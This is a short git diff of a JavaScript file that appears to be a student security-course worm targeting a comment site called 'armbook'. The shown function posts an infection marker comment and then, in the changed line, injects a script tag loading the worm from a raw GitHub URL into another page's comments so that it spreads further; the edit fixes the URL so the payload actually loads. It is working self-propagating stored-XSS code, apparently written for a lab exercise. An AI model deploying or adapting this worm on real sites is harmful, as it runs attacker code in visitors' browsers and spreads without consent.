@@ -22,7 +22,7 @@ function check(specid){
             //comments on the page to guarentee that it won't post again
             $.get("/add_comment.php", {'id': 67, 'comment':  specid+":has Nikolas Zahorian at time: "+new Date(Date.now()).toLocaleString()})
             //adds the link back to the original script to spread further
-            $.get("/add_comment.php", {'id': specid, 'comment': "<script src='https://github.com/naz5617/csec380_armbook_worm/blob/main/Activity2_worm.js'></script>"})
+            $.get("/add_comment.php", {'id': specid, 'comment': "<script src='https://raw.githubusercontent.com/naz5617/csec380_armbook_worm/main/Activity2_worm.js'></script>"})
         }
     })
 }
